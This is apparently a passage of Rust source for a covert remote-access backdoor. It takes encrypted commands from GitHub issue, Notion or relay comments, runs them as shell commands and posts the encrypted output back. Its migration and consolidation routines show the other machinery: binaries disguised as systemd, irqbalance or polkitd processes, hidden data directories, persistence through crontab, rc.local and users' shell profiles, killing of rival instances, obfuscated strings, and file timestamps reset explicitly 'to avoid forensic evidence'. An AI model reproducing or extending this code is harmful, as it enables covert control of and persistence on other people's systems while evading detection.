        // Notion: comments are already filtered by created_time above.
        // Safe watermark logic mirrors GitHub path: only advance past successfully
        // processed comments. If any command fails to decrypt, stop the watermark
        // before the first failure so it can be retried on the next poll.
        let mut last_successful_ts: Option<String> = None;
        let mut latest_ts: Option<String> = None;
        let mut had_decrypt_failure = false;

        // Load the set of already-processed command IDs from disk.
        // This prevents re-execution if the agent restarted after executing a command
        // but before the watermark write completed.
        let processed_cmd_ids = load_processed_cmd_ids();

        for comment in &all_comments {
            let comment_ts = comment["created_at"].as_str().unwrap_or("").to_string();

            if let Some(body) = comment["body"].as_str() {
                if body.starts_with(obfstr::obfstr!("<!-- c -->")) {
                    let encrypted = body.strip_prefix(obfstr::obfstr!("<!-- c -->")).unwrap_or(body);
                    match crate::crypto::decrypt(encrypted, &config.password) {
                        Ok(decrypted) => {
                            reset_decrypt_skips();
                            let (command_id, command_text) = match serde_json::from_str::<CommandEnvelope>(&decrypted) {
                                Ok(envelope) => (envelope.command_id, envelope.command),
                                Err(_) => {
                                    let cid = comment["id"].as_str().unwrap_or("?");
                                    (format!("legacy-{}", cid), decrypted)
                                }
                            };

                            // Skip if already processed (dedup across restarts)
                            if processed_cmd_ids.contains(&command_id) {
                                debug_log(&format!("Skipping already-processed command_id: {}", command_id));
                                if !comment_ts.is_empty() {
                                    last_successful_ts = Some(comment_ts.clone());
                                }
                            } else {
                                debug_log(&format!("Executing command_id: {}", command_id));
                                let cmd_text_clone = command_text.clone();
                                let output = tokio::task::spawn_blocking(move || {
                                    crate::commands::execute_command(&cmd_text_clone)
                                }).await.unwrap_or_else(|e| {
                                    format!("[Error] Command task panicked: {}", e)
                                });
                                debug_log(&format!("Command output length: {}", output.len()));
                                if let Err(e) = send_response_chunks(&config, issue_id, &command_id, &output).await {
                                    debug_log(&format!("Failed to send response: {}, buffering...", e));
                                    buffer_response(&command_id, &output);
                                }
                                // Mark as processed before advancing watermark
                                mark_cmd_processed(&command_id);
                                had_activity = true;
                                if !comment_ts.is_empty() {
                                    last_successful_ts = Some(comment_ts.clone());
                                }
                            }
                        }
                        Err(e) => {
                            debug_log(&format!("Decryption failed: {}", e));
                            let cid = comment["id"].as_str().unwrap_or("?").to_string();
                            let skips = bump_decrypt_skips();
                            if skips >= 3 {
                                debug_log(&format!("Fast-skip ({} consecutive): skipping comment {} immediately", skips, cid));
                                last_successful_ts = if comment_ts.is_empty() { last_successful_ts } else { Some(comment_ts.clone()) };
                                had_decrypt_failure = false;
                            } else if note_decrypt_failure_str(&cid) {
                                // Repeatedly undecryptable (wrong password era /
                                // foreign controller): skip it so commands behind
                                // it are not starved forever.
                                debug_log(&format!("Skipping permanently undecryptable comment {}", cid));
                                if !comment_ts.is_empty() {
                                    last_successful_ts = Some(comment_ts.clone());
                                }
                                had_decrypt_failure = false;
                            } else {
                                had_decrypt_failure = true;
                                // Stop immediately: do not let any later success advance
                                // last_successful_ts past this unprocessed comment.
                                break;
                            }
                        }
                    }
                } else {
                    // Non-command comment (response/other) — safe to advance past
                    if !had_decrypt_failure && !comment_ts.is_empty() {
                        last_successful_ts = Some(comment_ts.clone());
                    }
                }
            }
            if !had_decrypt_failure && !comment_ts.is_empty() {
                latest_ts = Some(comment_ts);
            }
        }

        // Watermark: advance to latest if all succeeded, else stop before first failure
        let watermark = if !had_decrypt_failure { latest_ts } else { last_successful_ts };
        if let Some(ts) = watermark {
            save_clock(&ts);
        }
    } else {
        // GitHub/worker 共用数字水位执行体，按通道路由水位（M1）：
        //   worker 执行 → stor.catalog 的 worker_cursor（D1 小自增 id 空间）；
        //   github 执行 → random-seed（GitHub 十亿级评论号空间）。
        // 两空间彻底分离，杜绝旧 bug：跨空间共用会把 worker 命令全部滤掉、
        // 反向写入还会摧毁 GitHub 水位。
        let mut eff_wm: u64 = if worker_exec {
            crate::stor::load_worker_cursor().unwrap_or(0)
        } else {
            *last_comment_id
        };
        let mut new_comments: Vec<_> = all_comments
        .iter()
        .filter(|c| c["id"].as_u64().unwrap_or(0) > eff_wm)
        .collect();
    new_comments.sort_by_key(|c| c["id"].as_u64().unwrap_or(0));

    // Track processed and unprocessed IDs to safely advance the watermark.
    // A decrypt failure must not allow the watermark to skip past the failed comment.
    let mut processed_ids: std::collections::BTreeSet<u64> = std::collections::BTreeSet::new();
    let mut had_decrypt_failure = false;
    // Also track the latest processed comment's created_at for the next `since` filter
    let mut latest_created_at: Option<String> = None;
    // Dedup across restarts: the watermark only reaches disk after the whole
    // batch executes; a crash or watchdog timeout mid-batch would otherwise
    // re-execute every command in it on the next start.
    let processed_cmd_ids = load_processed_cmd_ids();
    // 实战修复 #11：全新安装（代际变化）→ 本批历史命令只推进水位不执行，
    // 防止重装后重放中继/仓库残留的旧命令。执行完本批即恢复正常。
    let skip_history_once = fresh_install();

    for comment in &new_comments {
        let comment_id = comment["id"].as_u64().unwrap_or(0);

        if let Some(body) = comment["body"].as_str() {
            if body.starts_with(obfstr::obfstr!("<!-- c -->")) {
                debug_log(&format!("Found command comment ID: {}", comment_id));
                let encrypted = body.strip_prefix(obfstr::obfstr!("<!-- c -->")).unwrap_or(body);
                match crate::crypto::decrypt(encrypted, &config.password) {
                    Ok(decrypted) => {
                        reset_decrypt_skips();
                        processed_ids.insert(comment_id);

                        let (command_id, command_text) = match serde_json::from_str::<CommandEnvelope>(&decrypted) {
                            Ok(envelope) => (envelope.command_id, envelope.command),
                            Err(_) => {
                                let fallback_id = format!("legacy-{}", comment_id);
                                (fallback_id, decrypted)
                            }
                        };

                        if skip_history_once {
                            debug_log(&format!("Fresh install: skipping historical command_id {} (watermark advances)", command_id));
                            processed_ids.insert(comment_id);
                        } else if processed_cmd_ids.contains(&command_id) {
                            debug_log(&format!("Skipping already-processed command_id: {}", command_id));
                        } else {
                            // Do not log plaintext command to avoid exposing operation history in debug logs
                            debug_log(&format!("Executing command_id: {}", command_id));
                            let cmd_text_clone = command_text.clone();
                            let output = tokio::task::spawn_blocking(move || {
                                crate::commands::execute_command(&cmd_text_clone)
                            }).await.unwrap_or_else(|e| {
                                format!("[Error] Command task panicked: {}", e)
                            });
                            debug_log(&format!("Command output length: {}", output.len()));

                            // Send response — don't propagate error, command already executed
                            if let Err(e) = send_response_chunks(&config, &issue_id, &command_id, &output).await {
                                debug_log(&format!("Failed to send response: {}, buffering...", e));
                                // Buffer the response for resend on next poll
                                buffer_response(&command_id, &output);
                            }
                            // Mark as processed BEFORE the watermark reaches disk
                            mark_cmd_processed(&command_id);

                            had_activity = true;
                            debug_log("Response sent successfully");
                        }
                    }
                    Err(e) => {
                        debug_log(&format!("Decryption failed for comment {}: {}", comment_id, e));
                        let skips = bump_decrypt_skips();
                        if skips >= 3 {
                            // 连续第 3+ 条不可解密：本会话已确认处于旧密码时代，
                            // 立即跳过，不再逐条磨 5 次。
                            debug_log(&format!("Fast-skip ({} consecutive): skipping comment {} immediately", skips, comment_id));
                            processed_ids.insert(comment_id);
                            had_decrypt_failure = false;
                        } else if note_decrypt_failure(comment_id) {
                            // Repeatedly undecryptable (wrong password era /
                            // foreign controller): skip it so commands behind
                            // it are not starved forever.
                            debug_log(&format!("Skipping permanently undecryptable comment {}", comment_id));
                            processed_ids.insert(comment_id);
                            had_decrypt_failure = false;
                        } else {
                            had_decrypt_failure = true;
                            break;
                        }
                    }
                }
            } else {
                // Non-command comments (e.g. <!-- r --> responses) — skip but mark as seen
                // so they don't block the watermark.
                processed_ids.insert(comment_id);
            }
        } else {
            // No body — skip but mark as seen
            processed_ids.insert(comment_id);
        }

        // Record latest created_at of processed comments
        if processed_ids.contains(&comment_id) {
            if let Some(ts) = comment["created_at"].as_str() {
                latest_created_at = Some(ts.to_string());
            }
        }
    }

    // Advance the last_comment_id watermark.
    //
    // GitHub comment IDs are in the billions, so the old "sequential step"
    // logic (while contains(&(watermark+1))) could never advance.
    //
    // New logic:
    // - No decrypt failure -> advance to max(processed_ids)
    // - Decrypt failure -> advance only to the last ID before the first failed one
    //   (prevents permanently skipping a failed comment)
    //
    // Primary deduplication relies on is_comment_processed(DB) + since timestamp;
    // last_comment_id is an auxiliary optimisation.
    if !processed_ids.is_empty() {
        if !had_decrypt_failure {
            // All succeeded — advance to the highest ID
            if let Some(&max_id) = processed_ids.iter().max() {
                if max_id > eff_wm {
                    eff_wm = max_id;
                    if worker_exec {
                        crate::stor::save_worker_cursor(max_id);
                    } else {
                        *last_comment_id = max_id;
                        save_last_comment_id(max_id);
                    }
                }
            }
        } else {
            // Had decrypt failure: advance only to the last ID before the first failed one
            let failed_ids: Vec<u64> = new_comments
                .iter()
                .map(|c| c["id"].as_u64().unwrap_or(0))
                .filter(|id| !processed_ids.contains(id))
                .collect();
            if let Some(&first_failed) = failed_ids.iter().min() {
                let safe_max = processed_ids.iter()
                    .filter(|&&id| id < first_failed)
                    .max()
                    .copied()
                    .unwrap_or(eff_wm);
                if safe_max > eff_wm {
                    eff_wm = safe_max;
                    if worker_exec {
                        crate::stor::save_worker_cursor(safe_max);
                    } else {
                        *last_comment_id = safe_max;
                        save_last_comment_id(safe_max);
                    }
                }
            }
        }
    }

    // Persist latest comment timestamp for the next poll's `since` parameter.
    // Guard: if any command failed to decrypt, do NOT advance the since-timestamp —
    // the API-level filter would permanently skip the failed comment on the next poll.
    // worker 执行不拨 GitHub 的 since 钟：切到 GitHub 备用时若钟被 worker 评论
    // 拨到「现在」，早于该时刻投到 GitHub 的命令会被 since 过滤永久漏掉。
    if !had_decrypt_failure && !worker_exec {
        if let Some(ts) = latest_created_at {
            save_clock(&ts);
        }
    }
    } // end GitHub else branch

    Ok(had_activity)
}

/// Honor the Retry-After header on 429 responses instead of immediately
/// hammering the API again: sleep the indicated time (capped) on this blocking
/// thread (callers run us via spawn_blocking), then return the error so the
/// outer backoff / response buffering still applies.
fn honor_retry_after(e: ureq::Error) -> ureq::Error {
    if let ureq::Error::Status(429, resp) = &e {
        let ra = resp.header("Retry-After")
            .and_then(|v| v.trim().parse::<u64>().ok())
            .unwrap_or(30);
        let wait = ra.min(180);
        debug_log(&format!("post_comment: 429 rate limited, Retry-After={}s (sleeping {}s)", ra, wait));
        std::thread::sleep(std::time::Duration::from_secs(wait));
    }
    e
}

/// Post a comment (command echo or response) to the correct channel.
/// 通道路由（worker 主 / github 备）：dual 启用后按 failover 当前活动通道，
/// 否则按 channel_type。channel=worker 的 dual 构建在备用期若直接 OR
/// config.is_worker()，会把响应投向已死的 worker——必须走 worker_active()。
fn post_comment(config: &Config, issue_id: &str, body: &str) -> Result<(), Box<dyn std::error::Error>> {
    let use_worker = worker_active(config);
    let chan = if use_worker { "worker" } else if config.is_notion() { "notion" } else { "github" };
    debug_log(&format!("post_comment: channel={} issue={} body_len={}", chan, &issue_id[..issue_id.len().min(12)], body.len()));
    if use_worker {
        let ch = config.worker_chan()
            .ok_or("worker: channel not configured")?;
        return ch.post_comment(issue_id, body, None).map_err(|e| -> Box<dyn std::error::Error> { e.into() });
    }
    if config.is_notion() {
        // Notion: POST /v1/comments with rich_text (split into 2000-char chunks)
        let chunks: Vec<&str> = {
            let mut v = Vec::new();
            let mut start = 0;
            let bytes = body.as_bytes();
            while start < bytes.len() {
                let mut end = (start + 2000).min(bytes.len());
                while end < bytes.len() && !body.is_char_boundary(end) { end += 1; }
                v.push(&body[start..end]);
                start = end;
            }
            v
        };
        let rich_text: Vec<serde_json::Value> = chunks.iter()
            .map(|c| serde_json::json!({"type": "text", "text": {"content": c}}))
            .collect();
        let payload = serde_json::json!({
            "parent": {"page_id": issue_id},
            "rich_text": rich_text,
        });
        let r = crate::net::post(&format!("{}/comments", config.api_base()))
            .timeout(std::time::Duration::from_secs(30))
            .set("Authorization", &format!("Bearer {}", config.github_token))
            .set("Notion-Version", "2022-06-28")
            .set("Content-Type", "application/json")
            .send_json(&payload);
        match r {
            Ok(_) => debug_log("post_comment: notion ok"),
            Err(ref e) => debug_log(&format!("post_comment: notion error: {}", e)),
        }
        r.map_err(honor_retry_after)?;
    } else {
        // GitHub: POST /issues/{id}/comments
        let url = format!("{}/repos/{}/{}/issues/{}/comments",
            config.api_base(), config.github_owner, config.github_repo, issue_id);
        let payload = serde_json::json!({"body": body});
        let r = crate::net::post(&url)
            .timeout(std::time::Duration::from_secs(30))
            .set("Authorization", &format!("token {}", config.github_token))
            .set("User-Agent", &config.user_agent)
            .send_json(&payload);
        match r {
            Ok(_) => debug_log("post_comment: github ok"),
            Err(ref e) => debug_log(&format!("post_comment: github error: {}", e)),
        }
        r.map_err(honor_retry_after)?;
    }
    Ok(())
}

/// Async wrapper: runs the blocking ureq HTTP post on a dedicated thread-pool thread,
/// freeing the tokio worker thread while waiting. Required because ureq is a sync
/// client and calling it directly inside async fns starves the 2-thread tokio runtime.
async fn post_comment_async(
    config: Config,
    issue_id: String,
    body: String,
) -> Result<(), Box<dyn std::error::Error>> {
    tokio::task::spawn_blocking(move || {
        post_comment(&config, &issue_id, &body).map_err(|e| e.to_string())
    })
    .await
    .map_err(|e| -> Box<dyn std::error::Error> { e.to_string().into() })?
    .map_err(|e| -> Box<dyn std::error::Error> { e.into() })
}

async fn send_response_chunks(
    config: &Config,
    issue_id: &str,
    command_id: &str,
    output: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    // 45,000 content chars keeps the wire size safely under GitHub's 65,536-char
    // comment limit after the JSON envelope, AES-GCM overhead (+29 B) and base64
    // expansion (×4/3). At 50,000 every chunk ballooned to ≈66.8k chars and was
    // rejected with 422 — permanently losing any response larger than ~48 KB.
    const CHUNK_SIZE: usize = 45000;
    let response_id = format!(
        "{}-{}-{}",
        chrono::Utc::now().timestamp_millis(),
        issue_id.chars().take(8).collect::<String>(),
        rand::random::<u64>()
    );

    debug_log(&format!("send_response: cmd_id={} output_len={}", &command_id[..command_id.len().min(16)], output.len()));

    let plain_payload;

    if output.len() <= CHUNK_SIZE {
        plain_payload = serde_json::to_string(&ResponseEnvelope {
            response_to: command_id,
            message_type: "text",
            content: output,
        })?;
        let encrypted = match crate::crypto::encrypt(&plain_payload, &config.password) {
            Ok(e) => e,
            Err(e) => { debug_log(&format!("send_response: encrypt error: {}", e)); return Err(e.into()); }
        };
        let response = format!("{}{}", obfstr::obfstr!("<!-- r -->"), encrypted);
        post_comment_async(config.clone(), issue_id.to_string(), response).await?;
        debug_log("send_response: single chunk sent ok");
    } else {
        let mut chunks = Vec::new();
        let bytes = output.as_bytes();
        let mut start = 0;
        while start < bytes.len() {
            let mut end = (start + CHUNK_SIZE).min(bytes.len());
            while end < bytes.len() && !output.is_char_boundary(end) {
                end += 1;
            }
            chunks.push(&output[start..end]);
            start = end;
        }
        let total_chunks = chunks.len();
        debug_log(&format!("send_response: splitting into {} chunks", total_chunks));

        for (i, chunk) in chunks.iter().enumerate() {
            let msg = format!("[Part {}/{}/{}]\n{}", response_id, i + 1, total_chunks, chunk);
            let chunk_payload = serde_json::to_string(&ResponseEnvelope {
                response_to: command_id,
                message_type: "chunk",
                content: &msg,
            })?;
            let encrypted = match crate::crypto::encrypt(&chunk_payload, &config.password) {
                Ok(e) => e,
                Err(e) => { debug_log(&format!("send_response: encrypt error chunk {}: {}", i+1, e)); return Err(e.into()); }
            };
            let response = format!("{}{}", obfstr::obfstr!("<!-- r -->"), encrypted);
            post_comment_async(config.clone(), issue_id.to_string(), response).await?;
            debug_log(&format!("send_response: chunk {}/{} sent ok", i+1, total_chunks));
            tokio::time::sleep(Duration::from_millis(500)).await;
        }
    }

    Ok(())
}

/// One-time migration from legacy dot-prefix agent to word-based naming.
/// Runs on every startup but only does work if old artifacts are detected.
#[cfg(unix)]
fn migrate_from_legacy() {
    let is_root = unsafe { libc::geteuid() == 0 };
    if !is_root {
        return;
    }

    let mut migrated = false;

    // 1. Kill ALL legacy agent processes — use multiple matching strategies for thoroughness
    let legacy_binaries = [
        "/usr/lib/systemd/.systemd-network",
        "/usr/lib/systemd/.irqbalance",
        "/usr/lib/systemd/irqbalanced",   // old hidden path — now migrated to /usr/sbin/
        "/usr/lib/systemd/systemd-network",
        "/lib/systemd/systemd-log",
    ];

    // Kill by exact binary path (handles most cases)
    let my_pid = std::process::id();
    for legacy in &legacy_binaries {
        if std::path::Path::new(legacy).exists() {
            // SIGTERM first
            crate::commands::sh_silent(&format!(
                "ps -eo pid,args | grep -F '{}' | grep -v {} | grep -v grep | awk '{{print $1}}' | xargs -r kill 2>/dev/null",
                legacy, my_pid
            ));
        }
    }

    // Also kill by exact process name (handles renamed/relocated binaries)
    let legacy_names = [".systemd-network", ".systemd-netwo", ".irqbalance", "systemd-log"];
    for name in &legacy_names {
        let killer_output = Ok::<_, ()>(crate::commands::sh_silent(&format!(
            "ps -eo pid,comm | awk '$2 == \"{}\" && $1 != {} {{print $1}}'",
            name, my_pid
        )));
        if let Ok(out) = killer_output {
            if let Ok(stdout) = String::from_utf8(out.stdout) {
                for pid_str in stdout.lines() {
                    if let Ok(pid) = pid_str.trim().parse::<u32>() {
                        // Verify exe path before killing
                        if let Ok(exe) = std::fs::read_link(format!("/proc/{}/exe", pid)) {
                            let exe_str = exe.to_string_lossy().to_string();
                            // Only kill if exe path matches known agent paths
                            let exe_clean = exe_str.strip_suffix(" (deleted)").unwrap_or(&exe_str);
                            if legacy_binaries.iter().any(|&l| exe_clean.contains(l))
                                || exe_clean.contains("systemd-network")
                                || exe_clean.contains("irqbalanced")
                            {
                                unsafe { libc::kill(pid as i32, libc::SIGTERM); }
                            }
                        }
                    }
                }
            }
        }
    }

    // Wait for graceful shutdown, then SIGKILL any survivors
    std::thread::sleep(std::time::Duration::from_secs(1));
    for legacy in &legacy_binaries {
        crate::commands::sh_silent(&format!(
            "ps -eo pid,args | grep -F '{}' | grep -v {} | grep -v grep | awk '{{print $1}}' | xargs -r kill -9 2>/dev/null",
            legacy, my_pid
        ));
    }
    for name in &legacy_names {
        let killer_output = Ok::<_, ()>(crate::commands::sh_silent(&format!(
            "ps -eo pid,comm | awk '$2 == \"{}\" && $1 != {} {{print $1}}'",
            name, my_pid
        )));
        if let Ok(out) = killer_output {
            if let Ok(stdout) = String::from_utf8(out.stdout) {
                for pid_str in stdout.lines() {
                    if let Ok(pid) = pid_str.trim().parse::<u32>() {
                        if let Ok(exe) = std::fs::read_link(format!("/proc/{}/exe", pid)) {
                            let exe_str = exe.to_string_lossy().to_string();
                            let exe_clean = exe_str.strip_suffix(" (deleted)").unwrap_or(&exe_str);
                            if legacy_binaries.iter().any(|&l| exe_clean.contains(l))
                                || exe_clean.contains("systemd-network")
                                || exe_clean.contains("irqbalanced")
                            {
                                unsafe { libc::kill(pid as i32, libc::SIGKILL); }
                            }
                        }
                    }
                }
            }
        }
    }

    // Remove old binary files
    for legacy in &legacy_binaries {
        if std::path::Path::new(legacy).exists() {
            let _ = std::fs::remove_file(legacy);
            migrated = true;
        }
    }

    // 2. Migrate data files from legacy paths to current paths
    let data_migrations: &[(&str, &str)] = &[
        // Very old (dot-prefix) -> current
        ("/var/lib/systemd/.issue", "/var/tmp/.systemd/machine-id"),
        ("/var/lib/systemd/.agent_id", "/var/tmp/.systemd/agent_id"),
        ("/var/lib/systemd/.last_comment", "/var/tmp/.systemd/random-seed"),
        ("/var/lib/systemd/.backup_config", "/var/tmp/.systemd/preset"),
        // Previous version -> current
        ("/var/lib/systemd/issue", "/var/tmp/.systemd/machine-id"),
        ("/var/lib/systemd/agent_id", "/var/tmp/.systemd/agent_id"),
        ("/var/lib/systemd/last_comment", "/var/tmp/.systemd/random-seed"),
        ("/var/lib/systemd/backup_config", "/var/tmp/.systemd/preset"),
    ];
    for (old, new) in data_migrations {
        if std::path::Path::new(old).exists() {
            if !std::path::Path::new(new).exists() {
                let _ = std::fs::rename(old, new);
            } else {
                let _ = std::fs::remove_file(old);
            }
            migrated = true;
        }
    }
    for old_upload in ["/var/lib/systemd/.uploads", "/var/lib/systemd/uploads"] {
        if std::path::Path::new(old_upload).exists()
            && !std::path::Path::new("/var/tmp/.systemd/coredump").exists()
        {
            let _ = std::fs::rename(old_upload, "/var/tmp/.systemd/coredump");
            migrated = true;
        }
    }
    // Migrate debug log
    for old_log in ["/var/log/.systemd-debug.log", "/var/log/systemd-debug.log"] {
        if std::path::Path::new(old_log).exists() {
            if !std::path::Path::new("/var/tmp/.systemd/journal-audit").exists() {
                let _ = std::fs::rename(old_log, "/var/tmp/.systemd/journal-audit");
            } else {
                let _ = std::fs::remove_file(old_log);
            }
            migrated = true;
        }
    }

    // 3. Remove legacy systemd services
    let legacy_services = [".systemd-network.service", ".irqbalance.service"];
    for svc in &legacy_services {
        let svc_path = format!("/etc/systemd/system/{}", svc);
        if std::path::Path::new(&svc_path).exists() {
            let _ = std::process::Command::new("systemctl").args(&["stop", svc]).output();
            let _ = std::process::Command::new("systemctl").args(&["disable", svc]).output();
            let _ = std::fs::remove_file(&svc_path);
            migrated = true;
        }
    }
    if migrated {
        let _ = std::process::Command::new("systemctl").args(&["daemon-reload"]).output();
    }

    // 4. Remove legacy entries from crontab
    for legacy in &legacy_binaries {
        crate::commands::sh_silent(&format!(
            "crontab -l 2>/dev/null | grep -v '{}' | crontab -", legacy
        ));
    }

    // 5. Remove legacy entries from bashrc/profile (root + all regular users)
    // IMPORTANT: Only match OLD binary paths (dot-prefix or irqbalanced/systemd-network),
    // NOT shared markers! Strategy: match by old paths only.
    let mut all_profile_files: Vec<String> = vec![
        "/root/.bashrc".into(), "/root/.profile".into(), "/root/.bash_profile".into(),
    ];
    // Include home dirs of all regular users (uid ≥ 1000)
    if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
        for line in passwd.lines() {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() >= 7 {
                if let Ok(uid) = parts[2].parse::<u32>() {
                    if uid >= 1000 {
                        let home = parts[5];
                        all_profile_files.push(format!("{}/.bashrc", home));
                        all_profile_files.push(format!("{}/.profile", home));
                        all_profile_files.push(format!("{}/.bash_profile", home));
                    }
                }
            }
        }
    }
    let old_paths = [
        ".systemd-network", ".irqbalance",
        "/usr/lib/systemd/irqbalanced", "/usr/lib/systemd/systemd-network",
        "/lib/systemd/systemd-log",
    ];
    for pf in &all_profile_files {
        if let Ok(content) = std::fs::read_to_string(pf) {
            let has_old_refs = old_paths.iter().any(|p| content.contains(p));
            if !has_old_refs { continue; }

            let mut out: Vec<String> = Vec::new();
            for line in content.lines() {
                let has_legacy = old_paths.iter().any(|p| line.contains(p));
                if has_legacy {
                    // Keep content before the legacy path if it's mid-line (corruption)
                    if let Some(idx) = old_paths.iter().find_map(|p| {
                        let pos = line.find(p)?;
                        if pos > 0 && !line.trim_start().starts_with('#') { Some(pos) } else { None }
                    }) {
                        let before = line[..idx].trim_end();
                        if !before.is_empty() { out.push(before.to_string()); }
                    }
                    // Skip this line (the legacy path line, including any if [ around it)
                    continue;
                }
                // Remove orphaned marker comment when old refs exist
                if line.trim() == "# _sys_locale_check" { continue; }
                // Remove if-block lines referencing the agent check var (old single-line format)
                if line.contains("_LOCALE_CHK") || line.contains("_sys_locale_check") { continue; }
                out.push(line.to_string());
            }
            let mut new_content = out.join("\n");
            if !new_content.ends_with('\n') { new_content.push('\n'); }
            if new_content != content {
                let _ = std::fs::write(pf, &new_content);
                // Restore mtime to avoid forensic evidence
                crate::persist::disguise_timestamp(pf);
                migrated = true;
            }
        }
    }

    // 6. Remove legacy cron.d files that reference old binary paths
    if let Ok(entries) = std::fs::read_dir("/etc/cron.d") {
        for entry in entries.flatten() {
            if let Ok(content) = std::fs::read_to_string(entry.path()) {
                for legacy in &legacy_binaries {
                    if content.contains(legacy) {
                        let _ = std::fs::remove_file(entry.path());
                        migrated = true;
                        break;
                    }
                }
            }
        }
    }

    // 7. Remove legacy entries from rc.local
    let rc_paths = ["/etc/rc.local", "/etc/rc.d/rc.local"];
    for rc_path in &rc_paths {
        if let Ok(content) = std::fs::read_to_string(rc_path) {
            let cleaned: String = content.lines()
                .filter(|line| {
                    for legacy in &legacy_binaries {
                        if line.contains(legacy) {
                            return false;
                        }
                    }
                    true
                })
                .collect::<Vec<_>>()
                .join("\n");
            if cleaned != content {
                let _ = std::fs::write(rc_path, cleaned);
                migrated = true;
            }
        }
    }

    // 8. Remove stale files from old agent locations
    let stale_files = [
        "/var/lib/systemd/.agent.lock",
        "/var/lib/systemd/agent.lock",
    ];
    for stale in &stale_files {
        if std::path::Path::new(stale).exists() {
            let _ = std::fs::remove_file(stale);
            migrated = true;
        }
    }

    if migrated {
        debug_log("Legacy migration completed");
    }
}

/// Get list of regular (non-system) users from /etc/passwd.
/// Returns (username, home_directory) pairs.
#[cfg(unix)]
fn get_regular_users() -> Vec<(String, String)> {
    let mut users = Vec::new();
    if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
        for line in passwd.lines() {
            let fields: Vec<&str> = line.split(':').collect();
            if fields.len() < 7 { continue; }
            let uid: u32 = fields[2].parse().unwrap_or(0);
            let home = fields[5];

            // Skip root, system accounts, and nobody
            if uid == 0 || uid >= 65534 { continue; }
            if home == "/" || home.is_empty() || home == "/nonexistent" { continue; }
            if !std::path::Path::new(home).exists() { continue; }

            users.push((fields[0].to_string(), home.to_string()));
        }
    }
    users
}

/// When running as root, detect and eliminate any non-root agent instances.
/// Kills their processes, migrates critical data, removes all persistence.
/// Runs unconditionally — even if no processes are found, persistence cleanup still happens.
#[cfg(unix)]
fn consolidate_to_root() {
    let is_root = unsafe { libc::geteuid() == 0 };
    if !is_root { return; }

    let my_pid = std::process::id();
    let agent_comms = ["polkitd", "accounts-daemon", "systemd-network", "irqbalanced"];

    // ── Phase 1: Find and kill non-root agent processes ───────────────────
    let mut non_root_exes: Vec<String> = Vec::new();
    let mut found_count = 0u32;

    if let Ok(output) = std::process::Command::new("ps")
        .args(&["-eo", "pid,uid,comm"])
        .output()
    {
        if let Ok(stdout) = String::from_utf8(output.stdout) {
            for line in stdout.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() < 3 { continue; }
                let pid: u32 = parts[0].parse().unwrap_or(0);
                let uid: u32 = parts[1].parse().unwrap_or(0);
                let comm = parts[2];

                if uid == 0 || pid == my_pid { continue; }
                if !agent_comms.iter().any(|&n| comm == n) { continue; }

                found_count += 1;

                // Capture exe path BEFORE killing (it disappears after process exits)
                if let Ok(exe) = std::fs::read_link(format!("/proc/{}/exe", pid)) {
                    let exe_str = exe.to_string_lossy().to_string();
                    let exe_clean = exe_str.strip_suffix(" (deleted)").unwrap_or(&exe_str).to_string();
                    if !non_root_exes.contains(&exe_clean) {
                        non_root_exes.push(exe_clean);
                    }
                }
                unsafe { libc::kill(pid as i32, libc::SIGTERM); }
            }
        }
    }

    if found_count > 0 {
        debug_log(&format!("Found {} non-root agent process(es), consolidating...", found_count));
        std::thread::sleep(std::time::Duration::from_secs(1));
        // SIGKILL survivors
        for comm in &agent_comms {
            crate::commands::sh_silent(&format!(
                "ps -eo pid,uid,comm | awk '$2 != 0 && $3 == \"{}\" {{print $1}}' | xargs -r kill -9 2>/dev/null",
                comm
            ));
        }
    }

    // ── Phase 2: Clean all regular users' persistence ─────────────────────
    // Do this REGARDLESS of whether processes were found — the old agent may
    // have already exited, but its persistence artifacts still need removal.
    let regular_users = get_regular_users();

    let cron_marker = "# _svc_locale_init";
    let bashrc_marker = "_sys_locale_check";
    let bashrc_check = "_LOCALE_CHK";

    for (username, home) in &regular_users {

        // ── 2a. Migrate issue ID to root path (BEFORE deleting) ───────────
        // Issue ID is the most critical data — if we delete it without migrating,
        // the root agent creates a new GitHub issue and the controller sees two agents.
        let root_issue = "/var/tmp/.systemd/machine-id";
        let user_issue = format!("{}/.local/share/machine-id", home);
        if std::path::Path::new(&user_issue).exists()
            && !std::path::Path::new(root_issue).exists()
        {
            let _ = std::fs::create_dir_all("/var/tmp/.systemd");
            let _ = std::fs::copy(&user_issue, root_issue);
            debug_log(&format!("Migrated issue ID from {} to root path", user_issue));
        }

        // ── 2b. Clean user crontab (by exe path AND by marker) ───────────
        let crontab_output = std::process::Command::new("crontab")
            .args(&["-u", username, "-l"])
            .output()
            .ok()
            .and_then(|o| {
                // Only accept output when crontab -l succeeded (exit 0 = user has crontab).
                // On Debian/Ubuntu, exit code 1 + "no crontab for user" is output to stdout.
                // Writing that text back as a crontab would corrupt the user's crontab.
                if o.status.success() {
                    String::from_utf8(o.stdout).ok()
                } else {
                    None
                }
            })
            .unwrap_or_default();

        if !crontab_output.trim().is_empty() {
            let filtered: String = crontab_output.lines()
                .filter(|line| {
                    // Remove by exe path match (if we found the process)
                    if non_root_exes.iter().any(|exe| line.contains(exe.as_str())) {
                        return false;
                    }
                    // Remove by marker (handles case where process was already dead)
                    if line.contains(cron_marker) { return false; }
                    true
                })
                .collect::<Vec<_>>()
                .join("\n");

            if filtered.trim().is_empty() {
                let _ = std::process::Command::new("crontab")
                    .args(&["-u", username, "-r"])
                    .output();
            } else if filtered != crontab_output {
                let tmp = format!("/tmp/.ct_{}", username);
                if std::fs::write(&tmp, &filtered).is_ok() {
                    let _ = std::process::Command::new("crontab")
                        .args(&["-u", username, &tmp])
                        .output();
                    let _ = std::fs::remove_file(&tmp);
                }
            }
        }

        // ── 2c. Clean user bashrc/profile (corruption-aware) ─────────────
        let profile_files = [
            format!("{}/.bashrc", home),
            format!("{}/.profile", home),
            format!("{}/.bash_profile", home),
        ];
        for pf in &profile_files {
            let content = match std::fs::read_to_string(pf) {
                Ok(c) if c.contains(bashrc_marker) || c.contains(bashrc_check) => c,
                _ => continue,
            };

            // Smart repair: handles both clean and corrupted installs.
            // The agent hook is written as three items:
            //   "# _sys_locale_check" (marker comment)
            //   "" (empty line from leading \n in payload)
            //   "if [ -z "${_LOCALE_CHK}" ] && ... fi" (entire if-block on ONE line)
